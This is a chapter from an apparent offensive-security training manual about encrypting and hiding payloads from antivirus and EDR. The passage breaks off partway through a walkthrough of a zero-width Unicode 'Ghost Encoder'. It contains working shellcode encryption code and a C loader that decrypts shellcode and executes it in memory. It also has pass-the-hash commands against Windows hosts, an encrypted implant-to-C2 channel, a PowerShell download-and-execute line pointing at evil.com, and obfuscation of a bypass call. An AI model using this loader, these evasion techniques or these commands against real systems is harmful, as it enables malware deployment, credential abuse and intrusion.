# Chapter 18 — Cryptography & Evasion: The Art of Hiding

**VADER-RCE Field Manual**
**Prerequisite**: Chapter 17 (Network Warfare), GaySun XOR payload experience
**Drill**: DRILLS/18_crypto_evasion/

---

## Why You Need This

You've built payloads. You've corrupted memory. You've pivoted through
networks. None of that matters if Defender catches you at the door.

Modern AV/EDR is a layered defense: static signature matching, behavioral
heuristics, memory scanning, API hook monitoring, cloud-based ML
classification. Each layer is a filter. Your payload has to pass through
ALL of them to execute.

Cryptography is your primary tool for evading static analysis. If
Defender can't read your payload, it can't match a signature against
it. But encryption alone isn't enough — you also need to evade behavioral
detection (what your code DOES), heuristic detection (what your code
LOOKS LIKE it might do), and memory scanning (what's in memory after
decryption).

This chapter covers both sides: the crypto fundamentals you need to
understand encryption/decryption in offensive operations, and the
evasion techniques that use those fundamentals to get past modern
defenses. You already used XOR in GaySun. Now you learn WHY it worked,
when it won't work, and what to use instead.

---

## WINDOWS SETUP

Every tool used in this chapter. Install everything before you start the drills.

### Python Cryptography Library — pycryptodome

**This is required before ANY Python code block in this chapter will run.**
Without it you get `ModuleNotFoundError: No module named 'Crypto'` on the very
first import line.

```powershell
# Install pycryptodome — provides the Crypto.* namespace used throughout
pip install pycryptodome

# Verify it installed correctly
python -c "from Crypto.Cipher import AES; print('pycryptodome OK')"
# Expected output: pycryptodome OK
```

**If you get "pip is not recognized":**
```powershell
python -m pip install pycryptodome
```

**If you have an old `pycrypto` installed (conflict):**
```powershell
pip uninstall pycrypto
pip install pycryptodome
```

### Hashcat — GPU Hash Cracker

Download: https://hashcat.net/hashcat/  
Download the Windows binary release (`.7z` file). Extract to `C:\hashcat\`.

```powershell
# Add to PATH for this session (run from extraction folder)
$env:PATH += ";C:\hashcat"

# Verify
hashcat --version
# Expected output: v6.2.6 (or similar version number)
```

**No admin rights required for hashcat itself.** GPU driver must be installed
(NVIDIA/AMD). If you see "No OpenCL platforms found", install your GPU drivers.

### Hashcat Wordlists

```powershell
# Download rockyou.txt (standard wordlist, ~133MB)
# Direct link: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
# Save to C:\hashcat\wordlists\rockyou.txt

# Verify
(Get-Item C:\hashcat\wordlists\rockyou.txt).Length
# Expected: ~139921497 (about 133MB)
```

### John the Ripper

John the Ripper runs on Linux. It requires WSL2.

```powershell
# Install WSL2 (requires admin, one-time setup)
wsl --install

# After reboot, inside WSL2 terminal:
sudo apt update && sudo apt install -y john
john --version
# Expected output: John the Ripper 1.9.0-jumbo-1 (or later)
```

> **Admin rights required** for `wsl --install`. Run that PowerShell command
> as Administrator. Everything after the reboot is normal user.

### Impacket Tools (ntlmrelayx, psexec, etc.)

Impacket is a Python library. Best run from WSL2 or a Kali/Parrot VM.

```bash
# Inside WSL2:
pip3 install impacket

# Verify
python3 -c "import impacket; print(impacket.__version__)"
# Expected output: a version string like 0.11.0
```

### evil-winrm

Requires WSL2 (Ruby-based tool).

```bash
# Inside WSL2:
sudo gem install evil-winrm

# Verify
evil-winrm --version
# Expected output: Evil-WinRM shell v3.x
```

### UPX Packer (optional, for packing section)

Download: https://upx.github.io/  
Windows binary available. Extract `upx.exe` to `C:\tools\`.

```powershell
C:\tools\upx.exe --version
# Expected output: Ultimate Packer for eXecutables ... v4.x
```

### PadBuster (optional, for padding oracle section)

Requires WSL2 and Perl.

```bash
# Inside WSL2:
sudo apt install -y libwww-perl
wget https://raw.githubusercontent.com/AonCyberLabs/PadBuster/master/padBuster.pl
chmod +x padBuster.pl
perl padBuster.pl --help
# Expected: usage information printed to screen
```

### C Compiler (for C code blocks)

The C loader examples in this chapter are conceptual reference. To actually
compile them you need a Windows C compiler.

```powershell
# Option 1: Visual Studio Build Tools (free, no IDE)
# Download: https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022
# Install "Desktop development with C++" workload

# Verify after install (open Developer Command Prompt)
cl.exe
# Expected: Microsoft C/C++ Optimizing Compiler version XX.XX

# Option 2: MinGW-w64 (lighter, gcc on Windows)
# Download: https://www.mingw-w64.org/downloads/ -> WinLibs standalone
# Extract, add bin\ folder to PATH
gcc --version
# Expected: gcc (MinGW-W64) 13.x.x or similar
```

> **Admin rights required** for Visual Studio Build Tools installer.

---

## Crypto Fundamentals — What You Actually Need

Skip the academic theory. You don't need to prove RSA's correctness
or implement AES from scratch. You need to know what each primitive
does, when to use it, and how defenders break it.

### Symmetric Encryption — One Key, Two Directions

Same key encrypts and decrypts. Fast. Used for bulk data.

**XOR — The Simplest Cipher**

You already know this from GaySun. XOR is reversible:

```
plaintext  XOR key = ciphertext
ciphertext XOR key = plaintext
```

```python
# XOR encryption/decryption — identical operation
def xor_crypt(data: bytes, key: bytes) -> bytes:
    # For every byte in data, XOR it with the corresponding key byte
    # (i % len(key)) makes the key repeat if it's shorter than data
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

shellcode = b"\xfc\x48\x83\xe4\xf0..."  # your raw shellcode bytes
key = b"\xde\xad\xbe\xef"               # 4-byte XOR key

encrypted = xor_crypt(shellcode, key)    # encrypt — XOR with key
decrypted = xor_crypt(encrypted, key)    # decrypt — same function, same key, reverses it
assert decrypted == shellcode            # sanity check: should be identical to original
```

### Expected Output

**Success:**
```
(no output — assert passes silently)
```

**Failure looks like `AssertionError` — means the decrypt didn't produce the
original bytes. Check you're using the same key for both calls.**

**Failure looks like `ModuleNotFoundError` — you haven't run `pip install pycryptodome` yet.**

---

**XOR's weakness**: With a short repeating key, XOR is trivially
broken by frequency analysis. Defender KNOWS this. Modern AV engines
XOR-decode suspicious blobs with common key lengths (1-16 bytes) and
check the result against signature databases. A 4-byte XOR key buys
you nothing against a competent scanner.

**When XOR still works**: Single-byte XOR against a unique key that
changes per build. Not for the crypto — for the obfuscation. It forces
the scanner to brute-force 256 possible decodings. Combined with other
techniques, it adds friction.

**AES — The Standard**

AES-128, AES-192, AES-256. Block cipher operating on 16-byte blocks.
This is what you use when you actually need encryption that holds up.

```python
from Crypto.Cipher import AES          # requires: pip install pycryptodome
from Crypto.Util.Padding import pad, unpad  # pad = add PKCS7 padding, unpad = strip it
from Crypto.Random import get_random_bytes  # cryptographically secure random bytes
import os

def aes_encrypt(plaintext: bytes, key: bytes) -> tuple:
    iv = get_random_bytes(16)           # random 16-byte IV — different every call
    cipher = AES.new(key, AES.MODE_CBC, iv)  # CBC mode cipher object
    # pad() adds bytes to make plaintext length a multiple of block_size (16)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    return iv, ciphertext               # return both — you need IV to decrypt

def aes_decrypt(iv: bytes, ciphertext: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)  # reconstruct cipher with same IV + key
    return unpad(cipher.decrypt(ciphertext), AES.block_size)  # decrypt then strip padding

# Generate a random 256-bit key (32 bytes = AES-256)
key = get_random_bytes(32)

# Encrypt shellcode
shellcode = b"\xfc\x48\x83\xe4\xf0..."  # your shellcode bytes here
iv, encrypted = aes_encrypt(shellcode, key)

# Decrypt at runtime
decrypted = aes_decrypt(iv, encrypted, key)
```

### Expected Output

**Success:**
```
(no output — decrypted will equal shellcode if you print/compare them)
```

**Quick test you can run:**
```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

key = get_random_bytes(32)
plaintext = b"hello world test"
iv = get_random_bytes(16)
cipher = AES.new(key, AES.MODE_CBC, iv)
ct = cipher.encrypt(pad(plaintext, AES.block_size))
cipher2 = AES.new(key, AES.MODE_CBC, iv)
pt = unpad(cipher2.decrypt(ct), AES.block_size)
print(pt)  # b'hello world test'
```

**Failure looks like `ValueError: Data must be aligned to block boundary in ECB mode` — means your plaintext wasn't padded before encrypting. Always use `pad()` on the input.**

**Failure looks like `ValueError: Padding is incorrect` on decrypt — means you're using a different IV or key to decrypt than you used to encrypt.**

---

**CBC mode**: Each block is XOR'd with the previous ciphertext block
before encryption. The first block uses the Initialization Vector (IV).
This means identical plaintext blocks produce different ciphertext
blocks — no patterns leak through.

**Why AES defeats static analysis**: Without the key, the ciphertext
is indistinguishable from random data. Defender can't brute-force a
256-bit key. It can't apply signature matching to random bytes. The
payload is invisible until runtime decryption.

**RC4 — Stream Cipher, Simple Implementation**

RC4 is broken for TLS but perfectly fine for payload encryption. It's
a stream cipher — generates a keystream from the key and XORs it with
the plaintext. Simpler to implement than AES, smaller code footprint.

```python
# RC4 implementation — small enough to embed in a loader
# No external imports needed — pure Python
def rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256))    # state array — 256 values, 0-255
    j = 0
    # Key-scheduling algorithm (KSA) — shuffles S using the key
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256  # key byte cycles if key is short
        S[i], S[j] = S[j], S[i]                    # swap — scrambles S based on key
    # Pseudo-random generation algorithm (PRGA) — generates keystream
    i = j = 0
    result = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]                    # another swap
        result.append(byte ^ S[(S[i] + S[j]) % 256])  # XOR data byte with keystream byte
    return bytes(result)

encrypted = rc4(b"my_secret_key", shellcode)         # encrypt
decrypted = rc4(b"my_secret_key", encrypted)         # decrypt — same function, same key
```

### Expected Output

**Success:**
```python
shellcode = b"\xfc\x48\x83\xe4\xf0\x50\x57"
enc = rc4(b"my_secret_key", shellcode)
dec = rc4(b"my_secret_key", enc)
print(dec == shellcode)   # True
print(enc.hex())          # something like: 8a3f7c1d2e... (different from input)
```

**Failure looks like `TypeError: 'int' object is not subscriptable` — means `key` was passed as a string not bytes. Use `b"key"` not `"key"`.**

---

**RC4 in the wild**: Cobalt Strike uses RC4 for stager communication.
Metasploit's `shikata_ga_nai` encoder uses a polymorphic XOR scheme
that's conceptually similar. Many real-world implants use RC4 because
it's fast, simple, and good enough for obfuscation.

### Asymmetric Encryption — Two Keys

Public key encrypts. Private key decrypts. Or: private key signs,
public key verifies. The math is hard to reverse (factoring large
primes for RSA, discrete logarithms for ECC).

**Where you'll encounter this in offensive ops**:
- **TLS/SSL**: Every HTTPS connection uses asymmetric crypto for key
  exchange, then symmetric crypto for the actual data. Your C2 traffic
  over HTTPS is protected by this.
- **SSH**: Key-based authentication uses RSA/Ed25519 keypairs.
- **Code signing**: Legitimate software is signed with a private key.
  Defenders check signatures. If you can sign your payload with a
  stolen code-signing certificate, it bypasses signature-based trust.
- **Key exchange**: Your implant and C2 server need a shared secret
  for symmetric encryption. Diffie-Hellman or RSA key exchange
  establishes this without ever transmitting the key in the clear.

```python
from Crypto.PublicKey import RSA        # requires: pip install pycryptodome
from Crypto.Cipher import PKCS1_OAEP   # OAEP = padding scheme for RSA encryption

# Generate RSA keypair (done once, offline — store the private key securely)
key = RSA.generate(2048)               # 2048-bit key — standard minimum
private_key = key.export_key()         # PEM-encoded private key bytes
public_key = key.publickey().export_key()  # PEM-encoded public key bytes

# Encrypt with public key (anyone can do this — public key can be distributed)
recipient_key = RSA.import_key(public_key)
cipher = PKCS1_OAEP.new(recipient_key)            # OAEP cipher using public key
encrypted = cipher.encrypt(b"secret_session_key_here")  # max ~214 bytes for 2048-bit RSA

# Decrypt with private key (only the key holder can do this)
private = RSA.import_key(private_key)
decipher = PKCS1_OAEP.new(private)                # OAEP cipher using private key
decrypted = decipher.decrypt(encrypted)            # recovers the original plaintext
```

### Expected Output

**Success:**
```python
print(decrypted)  # b'secret_session_key_here'
```

**Failure looks like `ValueError: RSA key format is not supported` — means the key bytes got corrupted or you passed the wrong variable. Print `private_key` and check it starts with `-----BEGIN RSA PRIVATE KEY-----`.**

**Failure looks like `ValueError: Plaintext is too long` — RSA can only encrypt small amounts of data (up to ~214 bytes for a 2048-bit key). Use RSA to encrypt a small AES key, then use AES for the actual payload.**

---

### Hashing — One-Way Functions

Hashing takes arbitrary-length input and produces a fixed-length digest.
It's one-way — you can't reverse a hash to get the original input. You
can only compare: does this input produce the same hash?

**Hash algorithms you'll encounter**:

| Algorithm | Output | Status | Where you'll see it |
|-----------|--------|--------|-------------------|
| MD5 | 128-bit | BROKEN (collisions) | Legacy file checksums, some password stores |
| SHA-1 | 160-bit | BROKEN (collisions) | Legacy certificate signing, git commits |
| SHA-256 | 256-bit | Current standard | File integrity, modern password hashing |
| SHA-512 | 512-bit | Strong | Linux /etc/shadow (sha512crypt) |
| NTLM | 128-bit | WEAK (unsalted MD4) | Windows password hashes. Your bread and butter. |
| NTLMv2 | Variable | Better (challenge-response) | Windows network authentication |
| Net-NTLMv2 | Variable | Challenge-response | What Responder captures |

**Why NTLM hashes are as good as passwords**:

NTLM is just `MD4(UTF-16LE(password))`. No salt. No iterations. Two
users with the same password have the same NTLM hash. And here's the
critical part for offensive ops: **Windows accepts NTLM hashes directly
for authentication.** You don't need to crack the hash to use it.

```bash
# Pass-the-Hash — authenticate with the hash, no password needed
# Using evil-winrm (run inside WSL2):
evil-winrm -i <target> -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Using impacket's psexec (run inside WSL2):
python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@<target>

# Using crackmapexec (run inside WSL2):
crackmapexec smb <target> -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

### Expected Output

**evil-winrm success:**
```
Evil-WinRM shell v3.x
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**Failure looks like `ERROR: An error of type WinRM::WinRMAuthorizationError` — means the hash is wrong, the account doesn't have WinRM access, or WinRM is not enabled on the target.**

**Failure looks like `Connection refused` — WinRM is not listening (port 5985/5986 closed). Try psexec instead.**

---

This is why NTLM hash extraction (from SAM, LSASS, DCSync) is such a
high-value post-exploitation step. The hash IS the credential.

---

## Encryption In Offensive Operations

### Encrypting Payloads

The goal: your payload binary/shellcode should look like random noise
to any static analysis tool until the moment it executes.

**The pattern**:
1. Generate shellcode (msfvenom, custom, whatever)
2. Encrypt it with a strong algorithm and unique key
3. Build a loader that contains: encrypted blob + decryption routine + key
4. At runtime: decrypt → allocate executable memory → copy → execute

```c
// C loader structure — the pattern every AV-evading loader follows
// Compile with: cl.exe loader.c /link bcrypt.lib  (or gcc -o loader loader.c -lbcrypt)
#include <windows.h>
#include <stdio.h>

// AES-encrypted shellcode blob (generated by your Python encryptor script)
// These are placeholder bytes — replace with real output from aes_encrypt()
unsigned char encrypted_shellcode[] = { 0x8a, 0x3f, 0x7c, ... };
unsigned char aes_key[] = { 0x01, 0x02, 0x03, ... };  // 32 bytes = AES-256 key
unsigned char aes_iv[]  = { 0xa1, 0xb2, 0xc3, ... };  // 16 bytes = CBC initialization vector

// AES-CBC decryption using Windows CNG (Cryptography Next Generation)
// CNG is built into Windows — no external crypto library needed in the binary
BOOL decrypt_payload(unsigned char* ciphertext, DWORD ct_len,
                     unsigned char* key, unsigned char* iv,
                     unsigned char** plaintext, DWORD* pt_len) {
    BCRYPT_ALG_HANDLE hAlg;   // algorithm provider handle
    BCRYPT_KEY_HANDLE hKey;   // key object handle

    // Open AES algorithm provider from the built-in CNG library
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    // Set chaining mode to CBC
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    // Import our key bytes into a CNG key object
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, 32, 0);

    // First call: get the output size without actually decrypting
    BCryptDecrypt(hKey, ciphertext, ct_len, NULL, iv, 16, NULL, 0, pt_len, BCRYPT_BLOCK_PADDING);

    // Allocate output buffer now that we know the size
    *plaintext = (unsigned char*)malloc(*pt_len);
    // Second call: actually decrypt into the buffer
    BCryptDecrypt(hKey, ciphertext, ct_len, NULL, iv, 16, *plaintext, *pt_len, pt_len, BCRYPT_BLOCK_PADDING);

    BCryptDestroyKey(hKey);             // clean up key object
    BCryptCloseAlgorithmProvider(hAlg, 0);  // clean up algorithm handle
    return TRUE;
}

int main() {
    unsigned char* shellcode;   // will hold decrypted shellcode
    DWORD shellcode_len;        // will hold its length

    // Decrypt at runtime — plaintext shellcode never on disk
    decrypt_payload(encrypted_shellcode, sizeof(encrypted_shellcode),
                    aes_key, aes_iv, &shellcode, &shellcode_len);

    // Allocate RW memory (not RWX yet — changing permissions separately is less suspicious)
    void* exec = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    memcpy(exec, shellcode, shellcode_len);  // copy decrypted shellcode into allocated region

    // Flip to executable — this permission change is what EDR watches
    DWORD old;  // old permissions stored here (required by VirtualProtect)
    VirtualProtect(exec, shellcode_len, PAGE_EXECUTE_READ, &old);

    // Cast the memory region to a function pointer and call it
    ((void(*)())exec)();

    return 0;
}
```

### Expected Output

**This is a C skeleton — it won't compile until you replace the `...` placeholders.**
The pattern to test: run your Python `aes_encrypt()` to produce real byte arrays,
paste them in place of the placeholder arrays, compile, and test in a VM.

**Failure looks like `LNK2019: unresolved external symbol BCrypt...` — means you forgot to link `bcrypt.lib`. Add `/link bcrypt.lib` to your compile command.**

**Failure looks like `Access violation` on the `((void(*)())exec)()` line — the shellcode is either corrupted during decryption or the key/IV don't match what was used to encrypt.**

---

**Key management for payloads**: The key has to be in the binary
somewhere (or derived at runtime). Options:
- **Hardcoded key**: Simplest. Key is in the binary. Defender could
  extract it and decrypt — but it has to KNOW it's a key first. Combined
  with string obfuscation, this works.
- **Environmental keying**: Derive the key from the target environment
  (hostname, domain name, username, MAC address). The payload only
  decrypts on the intended target. Sandbox analysis fails because the
  sandbox has different environment values.
- **Remote key fetch**: Payload calls home to get the key. If the C2
  server is down, the payload never decrypts. Clean forensics.
- **Staged delivery**: First stage is tiny and innocuous — it downloads
  and decrypts the second stage. The encrypted payload never touches
  disk as a file.

### Encrypting C2 Traffic

Your implant needs to talk to your server. That traffic needs to be
encrypted and look legitimate.

**TLS (HTTPS C2)**: The easiest option. Your C2 traffic looks like
normal HTTPS browsing. Use legitimate certificates (Let's Encrypt),
domain fronting (if still available), or CDN redirectors.

**Custom crypto channel**: For situations where you need more control:

```python
# Simple encrypted C2 communication pattern
# Requires: pip install pycryptodome
import socket
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import struct  # for packing/unpacking binary integers

SHARED_KEY = b'\x00' * 32  # 32-byte AES-256 key — in reality, derived via key exchange

def encrypt_msg(plaintext: bytes) -> bytes:
    iv = get_random_bytes(16)              # fresh random IV for each message
    cipher = AES.new(SHARED_KEY, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(plaintext, AES.block_size))
    # Pack as: [4-byte length][16-byte IV][ciphertext]
    # '>I' = big-endian unsigned int (4 bytes) for the length prefix
    return struct.pack('>I', len(ct)) + iv + ct

def decrypt_msg(data: bytes) -> bytes:
    length = struct.unpack('>I', data[:4])[0]  # read 4-byte length prefix
    iv = data[4:20]                             # next 16 bytes are the IV
    ct = data[20:20+length]                     # rest is ciphertext
    cipher = AES.new(SHARED_KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size)

# Implant sends encrypted tasking result
def send_result(sock, result: bytes):
    encrypted = encrypt_msg(result)  # encrypt before sending
    sock.send(encrypted)

# C2 server receives and decrypts
def recv_task(sock) -> bytes:
    data = sock.recv(4096)           # receive raw encrypted bytes
    return decrypt_msg(data)         # decrypt and return plaintext
```

### Expected Output

**Loopback test to verify encrypt/decrypt round-trip:**
```python
msg = b"whoami result: NT AUTHORITY\\SYSTEM"
encrypted = encrypt_msg(msg)
print(f"Encrypted length: {len(encrypted)} bytes")   # longer than plaintext due to IV + padding
decrypted = decrypt_msg(encrypted)
print(decrypted)   # b'whoami result: NT AUTHORITY\\SYSTEM'
```

**Failure looks like `struct.error: unpack requires a buffer of 4 bytes` — means the received data is incomplete. Your recv() didn't get the full message. In real code, loop recv() until you have all bytes.**

---

**Malleable C2 profiles** (Cobalt Strike concept): Shape your C2 traffic
to mimic legitimate application traffic — match HTTP headers, URI
patterns, user-agent strings, and timing of a real application. The
encrypted payload rides inside what looks like normal API calls.

---

## Encoding vs Encryption vs Obfuscation

These are NOT interchangeable. Confusing them is how payloads get caught.

### Encoding — Reversible Without a Key

Encoding transforms data into a different representation. No key needed
to reverse it. Base64, URL encoding, hex encoding — these are FORMAT
CONVERSIONS, not security measures.

```bash
# Base64 encoding a PowerShell command
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://evil.com/shell.ps1")' | base64

# Defender's response to base64:
# "Oh look, a base64 string being passed to PowerShell. Let me decode it.
#  Yep, that's malicious. Blocked."

# AMSI literally decodes base64 before scanning
# Base64 is NOT evasion. It's a FORMAT.
```

**When encoding IS useful**: Not for hiding content, but for transport.
Base64 a binary payload to embed it in a text-based protocol (HTTP,
DNS TXT records). The encoding solves a transport problem, not a
detection problem.

### Encryption — Requires a Key to Reverse

Encryption transforms data using a key. Without the key, the data is
unrecoverable. This IS a security measure.

**The spectrum of strength against AV**:
- **Single-byte XOR**: Defender brute-forces all 256 keys. Trivially
  broken. Maybe buys you 10 seconds of analysis time.
- **Multi-byte XOR (short key)**: Defender tries common key lengths
  (2-32 bytes). Crackable via frequency analysis. Slightly better.
- **XOR with key = length of payload**: One-time pad. Theoretically
  unbreakable. But storing a key the same size as the payload is
  impractical and the key itself looks suspicious.
- **AES-CBC with random key**: Defender cannot break this with static
  analysis. The ciphertext is indistinguishable from random data.
  The key must be somewhere in the binary or derived at runtime —
  that's the weak point, but it's a much harder problem for automated
  scanners.

### Obfuscation — Making Code Hard to Read

Obfuscation doesn't hide data — it makes the CODE harder to analyze.
Variable renaming, control flow flattening, dead code insertion, string
splitting.

```python
# Before obfuscation:
import subprocess
subprocess.Popen(["powershell", "-ep", "bypass", "-c", "IEX(...)"])

# After basic obfuscation:
import subprocess as _0x1f
# Build the string "powershell" by concatenating individual character codes
_0x2a = chr(112)+chr(111)+chr(119)+chr(101)+chr(114)+chr(115)+chr(104)+chr(101)+chr(108)+chr(108)
_0x3b = [_0x2a, "-ep", "bypass", "-c", "IEX(...)"]
# Call subprocess.Popen by constructing the attribute name via chr() calls
getattr(_0x1f, chr(80)+chr(111)+chr(112)+chr(101)+chr(110))(_0x3b)

# After GOOD obfuscation:
# Control flow is flattened, strings are encrypted, API calls are resolved
# dynamically, dead code paths are inserted, variable names are randomized.
# A human reverser needs hours. Automated analysis needs specific deobfuscation.
```

**The hierarchy**: Encoding < Obfuscation < Encryption. Use encryption
for the payload, obfuscation for the loader code, and encoding only
for transport.

---

## Why AES-Encrypted Shellcode Still Gets Caught

AES-256 is mathematically unbreakable. Defender cannot brute-force the key.
So why does AV still catch AES-encrypted payloads?

**The answer is entropy analysis.**

### Shannon Entropy — The Math That Gets You Killed

Shannon entropy measures the randomness of data on a scale of 0 to 8 bits per byte.

- Plain English text: ~4.5 bits/byte (predictable letter frequencies)
- Compiled executable (.exe): ~6.0–6.5 bits/byte (structured but varied)
- Compressed data (ZIP, PNG): ~7.5–7.9 bits/byte (near-maximum)
- **AES-encrypted data: ~7.99 bits/byte** (indistinguishable from random)

Modern AV and sandboxes scan every PE section and calculate entropy.
A `.text` section or resource with entropy above 7.5 is flagged automatically.
It does not matter what the data IS — the entropy score alone triggers inspection.

This is why `msfvenom -e x86/shikata_ga_nai` gets caught. Not because
Defender knows the signature — because the encoded blob looks like random
noise, and random noise inside a PE file means one thing: encrypted shellcode.

```python
# Calculate Shannon entropy — run this on your own payloads to check
import math
import collections

def shannon_entropy(data: bytes) -> float:
    """Returns entropy in bits per byte. Max = 8.0 (perfectly random)."""
    if not data:
        return 0.0
    # Count how often each byte value (0-255) appears
    counts = collections.Counter(data)
    total = len(data)
    entropy = 0.0
    for count in counts.values():
        # Probability of this byte value appearing
        p = count / total
        # Shannon formula: -sum(p * log2(p))
        entropy -= p * math.log2(p)
    return entropy

# Test it yourself
import os
random_bytes = os.urandom(1024)          # 1KB of random bytes
print(f"Random data:  {shannon_entropy(random_bytes):.4f} bits/byte")  # ~7.99

english_text = b"The quick brown fox jumps over the lazy dog. " * 22
print(f"English text: {shannon_entropy(english_text):.4f} bits/byte")  # ~4.1

# Now check your AES-encrypted shellcode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

key = get_random_bytes(32)
iv  = get_random_bytes(16)
shellcode = b"\xfc\x48\x83\xe4\xf0\x50\x57\x52\x65\x58\x20\x20" * 85  # fake shellcode
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(pad(shellcode, AES.block_size))

print(f"AES-encrypted shellcode: {shannon_entropy(encrypted):.4f} bits/byte")  # ~7.98
# That number will get you flagged.
```

### EXPECTED OUTPUT

```
Random data:  7.9961 bits/byte
English text: 4.1023 bits/byte
AES-encrypted shellcode: 7.9812 bits/byte
```

Any PE section scoring above 7.2 draws attention. Above 7.5 is an automatic
flag in most commercial AV products. Your AES blob scores 7.98 — it's screaming
at the scanner.

### The Solution: Unicode Steganography

The Ghost Encoder approach is different. Instead of encrypting the payload
into a high-entropy binary blob, it encodes it into **zero-width Unicode
characters** that are invisible to humans and to most AV engines.

The result:
- The output file appears **completely blank** in any text editor
- File entropy looks like **normal Unicode text** (~4-5 bits/byte)
- No high-entropy PE section — there IS no PE section, it's a `.ps1` file
- AV signature scanners see Unicode whitespace and the visible decoder stub
- The actual payload exists nowhere on disk in a recognizable form

The entropy win is critical. A file full of zero-width Unicode characters
has low entropy because there are only 16 unique characters. Repetition
drives entropy down. A shellcode that uses 100+ unique byte values packed
tight drives entropy up. Ghost encoding collapses the shellcode's entropy
into a 16-character alphabet, making it statistically invisible.

| Encoding Method | Entropy | AV Flag? | Payload visible? |
|-----------------|---------|----------|-----------------|
| Raw shellcode | ~6.2 bits/byte | YES — signature | YES |
| XOR (4-byte key) | ~7.5 bits/byte | YES — brute forced | Partially |
| AES-256 CBC | ~7.99 bits/byte | YES — entropy flag | NO |
| Ghost (zero-width Unicode) | ~3.8 bits/byte | NO | NO — invisible |

// DRILL: Run `shannon_entropy()` on a raw msfvenom payload, an AES-encrypted version of it, and a Ghost-encoded version. Print all three scores side by side. Confirm Ghost is the lowest.

---

## Ghost Encoder — ghost_encode.py Line by Line

The Ghost Encoder lives at `C:/Users/gwu07/Desktop/ghost-encoder/ghost_encode.py`.
This is a complete walkthrough of every mechanism in the file.

### The GHOST_ALPHABET — 16 Invisible Characters

```python
# ghost_encode.py lines 28-45
# 16 zero-width Unicode characters — our hex alphabet
# Each represents one hex digit (0x0 through 0xF)
# All are invisible in standard text rendering
GHOST_ALPHABET = [
    '​',  # 0x0  ZERO WIDTH SPACE           — U+200B
    '‌',  # 0x1  ZERO WIDTH NON-JOINER       — U+200C
    '‍',  # 0x2  ZERO WIDTH JOINER           — U+200D
    '⁠',  # 0x3  WORD JOINER                 — U+2060
    '⁡',  # 0x4  FUNCTION APPLICATION        — U+2061
    '⁢',  # 0x5  INVISIBLE TIMES             — U+2062
    '⁣',  # 0x6  INVISIBLE SEPARATOR         — U+2063
    '⁤',  # 0x7  INVISIBLE PLUS              — U+2064
    '⁪',  # 0x8  INHIBIT SYMMETRIC SWAPPING  — U+206A
    '⁫',  # 0x9  ACTIVATE SYMMETRIC SWAPPING — U+206B
    '⁬',  # 0xA  INHIBIT ARABIC FORM SHAPING — U+206C
    '⁭',  # 0xB  ACTIVATE ARABIC FORM SHAPING— U+206D
    '⁮',  # 0xC  NATIONAL DIGIT SHAPES       — U+206E
    '⁯',  # 0xD  NOMINAL DIGIT SHAPES        — U+206F
    '﻿',  # 0xE  ZERO WIDTH NO-BREAK SPACE   — U+FEFF (the BOM character)
    '᠎',  # 0xF  MONGOLIAN VOWEL SEPARATOR   — U+180E
]
```

These are all Unicode **formatting characters** — they affect text layout but
render as zero pixels. Open a file full of them in Notepad. It looks blank.
Open it in VS Code. It looks blank. Open it in Chrome. It looks blank.

The characters fall into several Unicode categories:
- **U+200B–U+200D**: Zero-width spaces, joiners — originally for text
  layout in complex scripts (Arabic, Thai). Render nothing.
- **U+2060–U+2064**: Invisible mathematical operators — used in MathML.
  No visible glyph whatsoever.
- **U+206A–U+206F**: Deprecated formatting characters — left over from
  Unicode 1.0. Still valid, still invisible, rarely processed.
- **U+FEFF**: The byte-order mark character. When not at the start of a file,
  it's treated as a zero-width no-break space. Invisible.
- **U+180E**: Mongolian Vowel Separator — originally a whitespace character
  for Mongolian script. Now classified as a non-character in Unicode 6.3+,
  but still renders as invisible in most implementations.

### Why These 16 Specifically

Hex encoding needs 16 symbols (0-F). The Ghost Encoder picks 16 characters
that are:
1. Zero-width — invisible in ALL major rendering engines
2. Not filtered by common text processing tools (not stripped by HTML, not
   removed by most sanitisers)
3. Preserved through most encoding pipelines (UTF-8 round-trips cleanly)
4. Not commonly used in legitimate PowerShell files (low false-positive noise)

### The Reverse Lookup Table

```python
# ghost_encode.py line 48
# Build a reverse dictionary: character -> integer (0-15)
# Used during decoding to convert each invisible char back to a hex digit
GHOST_REVERSE = {c: i for i, c in enumerate(GHOST_ALPHABET)}
# Result: {'​': 0, '‌': 1, '‍': 2, ... '᠎': 15}
```

### The Encoding Loop

```python
# ghost_encode.py lines 51-63
def encode_bytes(data: bytes) -> str:
    """Encode raw bytes into zero-width Unicode characters.

    Each byte becomes 2 invisible characters (high nibble + low nibble).
    The result is completely invisible in text editors.
    """
    encoded = []
    for byte in data:
        # Split each byte into two 4-bit halves (nibbles)
